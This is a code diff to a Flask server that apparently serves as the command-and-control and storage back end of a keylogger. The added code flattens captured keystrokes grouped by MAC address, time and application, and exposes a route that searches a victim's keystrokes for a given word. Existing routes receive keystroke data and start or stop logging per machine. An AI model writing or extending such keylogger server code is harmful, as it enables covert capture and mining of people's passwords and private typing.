@@ -97,7 +97,7 @@ def show_folder_contents(folder_name):
 
 
 
-# @app.route('')
+# @app.route('/folders/<folder_name>')
 @app.route('/folders/<folder_name>/<from_date>/<last_date>', methods=['GET'])
 @login_required
 def collect_content_between_files_in_folder( folder_name, from_date, last_date):
@@ -262,8 +262,52 @@ def stop_keylogger(folder_name):
     response = {"message": "stop in the next messege to the server:111"}
     return flask.jsonify(response),200
 
+def get_key_presses_from_json(json_data):
+    key_presses = []
+
+    # עובר על כל כתובת MAC במילון
+    for mac_address, date_info in json_data.items():
+        # עובר על כל זמן (תאריך ושעה)
+        for time_key, mac_data in date_info.items():
+            # עובר על כל כתובת MAC שנמצאת תחת הזמן הזה
+            for mac, date_time_info in mac_data.items():
+                # עובר על כל תאריך ושעה
+                for date_time, app_data in date_time_info.items():
+                    # עובר על כל האפליקציות
+                    for app, keys in app_data.items():
+                        # מוסיף את כל הלחיצות לרשימה
+                        key_presses.extend(keys)
+
+    return key_presses
 
 
+def count_occurrences_of_word(word, key_presses):
+    # המרת המילה לרשימה של תווים
+    word_list = list(word)
+
+    # משתנה לספירת התוצאות
+    count = 0
+
+    # עוברים על רשימת ההקשות
+    for i in range(len(key_presses) - len(word_list) + 1):
+        # בודקים אם יש רצף של הקשות התואם למילה
+        if key_presses[i:i + len(word_list)] == word_list:
+            count += 1
+    return count
+
+
+@app.route('/folders/<folder_name>/search/<word>', methods=['GET'])
+@login_required
+def search_word_by_address(folder_name,word):
+    data = load_data(folder_name)
+    print(data)
+    print()
+    print()
+    list_of_pressed = get_key_presses_from_json(data)
+    print(list_of_pressed)
+    count = count_occurrences_of_word(word,list_of_pressed)
+    print(count)
+    return jsonify({folder_name: {word: count}})
 
 
 @app.route('/add_data', methods=['POST'])
@@ -320,7 +364,7 @@ def save_new_data(data):
     with open(path+rf"\{date}.json" , "w" , encoding='utf-8') as file:
         json.dump(data , file , indent=4 , ensure_ascii=False)
 
-import json
+
 
 def get_first_string_from_json(json_content):
     """
@@ -395,8 +439,13 @@ def chek_if_stop_by_mac_address(json_data):
             data = json.load(f)
     except FileNotFoundError:
         data = {}
-    if data[mac_address] == False:
-        return True
+    try:
+        if data[mac_address] == False:
+            return True
+    except:
+        data[mac_address] = True
+        with open(file_path, 'w', encoding='utf-8') as f:
+            json.dump(data,f,ensure_ascii=False,indent=4)
     return False
 
 @app.route('/health',methods=['GET'])
@@ -422,6 +471,7 @@ def change_action_to_active():
     # כתיבת המילון המעודכן חזרה לקובץ
     with open(file_path, 'w', encoding='utf-8') as f:
         json.dump(data, f, ensure_ascii=False, indent=4)
+
 change_action_to_active()
 if __name__ == '__main__':
     app.run(debug=True)
